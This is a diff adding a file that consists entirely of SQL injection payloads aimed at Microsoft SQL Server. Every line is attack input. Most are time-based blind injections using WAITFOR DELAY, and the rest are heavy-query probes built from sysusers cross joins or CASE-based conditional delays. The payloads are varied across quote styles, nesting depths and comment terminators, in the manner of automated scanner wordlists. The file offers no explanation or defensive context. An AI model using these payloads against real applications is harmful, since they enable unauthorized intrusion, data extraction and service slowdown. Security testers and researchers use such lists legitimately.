@@ -1,0 +1,200 @@
+,,.''""""(
+'JuTr<'">zHLL
+) WAITFOR DELAY '0:0:15'
+') WAITFOR DELAY '0:0:15'
+' WAITFOR DELAY '0:0:15'
+" WAITFOR DELAY '0:0:15'
+) WAITFOR DELAY '0:0:15' AND (1489=1489
+)) WAITFOR DELAY '0:0:15' AND ((9889=9889
+))) WAITFOR DELAY '0:0:15' AND (((5924=5924
+ WAITFOR DELAY '0:0:15'
+') WAITFOR DELAY '0:0:15' AND ('MBRy'='MBRy
+')) WAITFOR DELAY '0:0:15' AND (('URwu'='URwu
+'))) WAITFOR DELAY '0:0:15' AND ((('VjzD'='VjzD
+' WAITFOR DELAY '0:0:15' AND 'thNc'='thNc
+') WAITFOR DELAY '0:0:15' AND ('ZrPy' LIKE 'ZrPy
+')) WAITFOR DELAY '0:0:15' AND (('Xhup' LIKE 'Xhup
+'))) WAITFOR DELAY '0:0:15' AND ((('apmd' LIKE 'apmd
+' WAITFOR DELAY '0:0:15' AND 'dJpf' LIKE 'dJpf
+") WAITFOR DELAY '0:0:15' AND ("ZwQw"="ZwQw
+")) WAITFOR DELAY '0:0:15' AND (("FGIZ"="FGIZ
+"))) WAITFOR DELAY '0:0:15' AND ((("IvYf"="IvYf
+" WAITFOR DELAY '0:0:15' AND "eJue"="eJue
+") WAITFOR DELAY '0:0:15' AND ("LLvj" LIKE "LLvj
+")) WAITFOR DELAY '0:0:15' AND (("MnZr" LIKE "MnZr
+"))) WAITFOR DELAY '0:0:15' AND ((("bOfG" LIKE "bOfG
+" WAITFOR DELAY '0:0:15' AND "OlkC" LIKE "OlkC
+%') WAITFOR DELAY '0:0:15' AND ('%'='
+%')) WAITFOR DELAY '0:0:15' AND (('%'='
+%'))) WAITFOR DELAY '0:0:15' AND ((('%'='
+%' WAITFOR DELAY '0:0:15' AND '%'='
+%") WAITFOR DELAY '0:0:15' AND ("%"="
+%")) WAITFOR DELAY '0:0:15' AND (("%"="
+%"))) WAITFOR DELAY '0:0:15' AND ((("%"="
+%" WAITFOR DELAY '0:0:15' AND "%"="
+%00') WAITFOR DELAY '0:0:15' AND ('DEts'='DEts
+%00')) WAITFOR DELAY '0:0:15' AND (('aPMZ'='aPMZ
+%00'))) WAITFOR DELAY '0:0:15' AND ((('unwF'='unwF
+%00' WAITFOR DELAY '0:0:15' AND 'ULmf'='ULmf
+ WAITFOR DELAY '0:0:15'-- pNqU
+ WAITFOR DELAY '0:0:15'# bpDz
+') WHERE 8131=8131 WAITFOR DELAY '0:0:15'-- 
+") WHERE 8148=8148 WAITFOR DELAY '0:0:15'-- 
+) WHERE 6243=6243 WAITFOR DELAY '0:0:15'-- 
+' WHERE 1673=1673 WAITFOR DELAY '0:0:15'-- 
+" WHERE 5284=5284 WAITFOR DELAY '0:0:15'-- 
+ WHERE 4110=4110 WAITFOR DELAY '0:0:15'-- 
+')) AS nhCr WHERE 4310=4310 WAITFOR DELAY '0:0:15'-- 
+")) AS PbTj WHERE 7053=7053 WAITFOR DELAY '0:0:15'-- 
+)) AS hhQx WHERE 7658=7658 WAITFOR DELAY '0:0:15'-- 
+') AS eYvr WHERE 5209=5209 WAITFOR DELAY '0:0:15'-- 
+") AS VupV WHERE 7458=7458 WAITFOR DELAY '0:0:15'-- 
+) AS tAdh WHERE 7902=7902 WAITFOR DELAY '0:0:15'-- 
+'||(SELECT 'pbzz' FROM DUAL WHERE 4959=4959 WAITFOR DELAY '0:0:15')||'
+'||(SELECT 'DhrB' WHERE 7374=7374 WAITFOR DELAY '0:0:15')||'
+'+(SELECT uuzJ WHERE 1557=1557 WAITFOR DELAY '0:0:15')+'
+'+(SELECT 'UAVq' WHERE 8419=8419 WAITFOR DELAY '0:0:15')+'
+' IN BOOLEAN MODE) WAITFOR DELAY '0:0:15'#
+) WAITFOR DELAY '0:0:15'--
+') WAITFOR DELAY '0:0:15'--
+' WAITFOR DELAY '0:0:15'--
+" WAITFOR DELAY '0:0:15'--
+)) WAITFOR DELAY '0:0:15'--
+))) WAITFOR DELAY '0:0:15'--
+ WAITFOR DELAY '0:0:15'--
+')) WAITFOR DELAY '0:0:15'--
+'))) WAITFOR DELAY '0:0:15'--
+") WAITFOR DELAY '0:0:15'--
+")) WAITFOR DELAY '0:0:15'--
+"))) WAITFOR DELAY '0:0:15'--
+%') WAITFOR DELAY '0:0:15'--
+%')) WAITFOR DELAY '0:0:15'--
+%'))) WAITFOR DELAY '0:0:15'--
+%' WAITFOR DELAY '0:0:15'--
+%") WAITFOR DELAY '0:0:15'--
+%")) WAITFOR DELAY '0:0:15'--
+%"))) WAITFOR DELAY '0:0:15'--
+%" WAITFOR DELAY '0:0:15'--
+%00') WAITFOR DELAY '0:0:15'--
+%00')) WAITFOR DELAY '0:0:15'--
+%00'))) WAITFOR DELAY '0:0:15'--
+%00' WAITFOR DELAY '0:0:15'--
+') WHERE 5344=5344 WAITFOR DELAY '0:0:15'--
+") WHERE 7129=7129 WAITFOR DELAY '0:0:15'--
+) WHERE 5626=5626 WAITFOR DELAY '0:0:15'--
+' WHERE 5289=5289 WAITFOR DELAY '0:0:15'--
+" WHERE 8995=8995 WAITFOR DELAY '0:0:15'--
+ WHERE 6844=6844 WAITFOR DELAY '0:0:15'--
+')) AS WHsn WHERE 4546=4546 WAITFOR DELAY '0:0:15'--
+")) AS ANoN WHERE 9675=9675 WAITFOR DELAY '0:0:15'--
+)) AS wIDy WHERE 3051=3051 WAITFOR DELAY '0:0:15'--
+') AS aPYs WHERE 3589=3589 WAITFOR DELAY '0:0:15'--
+") AS Aftk WHERE 9864=9864 WAITFOR DELAY '0:0:15'--
+) AS dsFi WHERE 7777=7777 WAITFOR DELAY '0:0:15'--
+'||(SELECT 'Exzj' FROM DUAL WHERE 4123=4123 WAITFOR DELAY '0:0:15'--
+'||(SELECT 'ZGez' WHERE 3438=3438 WAITFOR DELAY '0:0:15'--
+'+(SELECT Mxve WHERE 2406=2406 WAITFOR DELAY '0:0:15'--
+'+(SELECT 'KMwI' WHERE 1325=1325 WAITFOR DELAY '0:0:15'--
+' IN BOOLEAN MODE) WAITFOR DELAY '0:0:15'--
+) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+') AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+' AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+" AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (6194=6194
+)) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((2520=2520
+))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (((5404=5404
+ AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+') AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('WTqw'='WTqw
+')) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (('rVbv'='rVbv
+'))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((('aquG'='aquG
+' AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'jZYt'='jZYt
+') AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('WzxK' LIKE 'WzxK
+')) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (('xNvg' LIKE 'xNvg
+'))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((('vSdz' LIKE 'vSdz
+' AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'luLc' LIKE 'luLc
+") AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ("Paoa"="Paoa
+")) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (("DhHo"="DhHo
+"))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((("efLF"="efLF
+" AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND "oTxw"="oTxw
+") AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ("gQzr" LIKE "gQzr
+")) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (("srmf" LIKE "srmf
+"))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((("sOQa" LIKE "sOQa
+" AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND "tpPv" LIKE "tpPv
+%') AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('%'='
+%')) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (('%'='
+%'))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((('%'='
+%' AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND '%'='
+%") AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ("%"="
+%")) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (("%"="
+%"))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((("%"="
+%" AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND "%"="
+%00') AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('hRcD'='hRcD
+%00')) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (('iPeT'='iPeT
+%00'))) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((('MwDJ'='MwDJ
+%00' AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'ATlI'='ATlI
+ AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- dnPA
+ AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)# vWam
+') WHERE 5493=5493 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+") WHERE 5906=5906 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+) WHERE 8911=8911 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+' WHERE 6347=6347 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+" WHERE 7057=7057 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+ WHERE 5475=5475 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+')) AS tXNy WHERE 2555=2555 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+")) AS TeIO WHERE 9832=9832 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+)) AS LhbU WHERE 1874=1874 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+') AS SxZk WHERE 8486=8486 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+") AS DoBQ WHERE 7267=7267 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+) AS dTLp WHERE 5451=5451 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- 
+'||(SELECT 'yiKt' FROM DUAL WHERE 7496=7496 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))||'
+'||(SELECT 'WUGU' WHERE 5596=5596 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))||'
+'+(SELECT ZsQi WHERE 2447=2447 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'
+'+(SELECT 'yuVQ' WHERE 1986=1986 AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'
+' IN BOOLEAN MODE) AND 2863=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)#
+) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+') AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+' AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+" AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+)) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+))) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+ AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+')) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+'))) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+") AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+")) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+"))) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%') AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%')) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%'))) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%' AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%") AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%")) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%"))) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%" AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%00') AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%00')) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%00'))) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+%00' AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+') WHERE 1592=1592 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+") WHERE 1649=1649 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+) WHERE 9558=9558 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+' WHERE 6536=6536 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+" WHERE 1528=1528 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+ WHERE 3887=3887 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+')) AS bHoi WHERE 8564=8564 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+")) AS txOB WHERE 7796=7796 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+)) AS slNt WHERE 4827=4827 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+') AS Qmsw WHERE 3310=3310 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+") AS nRXI WHERE 7364=7364 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+) AS kQZd WHERE 2798=2798 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+'||(SELECT 'ZjTg' FROM DUAL WHERE 4250=4250 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+'||(SELECT 'pLma' WHERE 4482=4482 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+'+(SELECT VLsi WHERE 9368=9368 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+'+(SELECT 'jqBs' WHERE 9375=9375 AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+' IN BOOLEAN MODE) AND 5875=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--
+(SELECT (CASE WHEN (9636=9636) THEN WAITFOR DELAY '0:0:15' ELSE 9636*(SELECT 9636 FROM master..sysdatabases) END))
+(SELECT (CASE WHEN (4606=4606) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 4606 END))
+',(SELECT (CASE WHEN (8000=8000) THEN WAITFOR DELAY '0:0:15' ELSE 8000*(SELECT 8000 FROM master..sysdatabases) END))
+,(SELECT (CASE WHEN (8000=8000) THEN WAITFOR DELAY '0:0:15' ELSE 8000*(SELECT 8000 FROM master..sysdatabases) END))
+',(SELECT (CASE WHEN (8402=8402) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 8402*(SELECT 8402 FROM master..sysdatabases) END))
+,(SELECT (CASE WHEN (8402=8402) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 8402*(SELECT 8402 FROM master..sysdatabases) END))
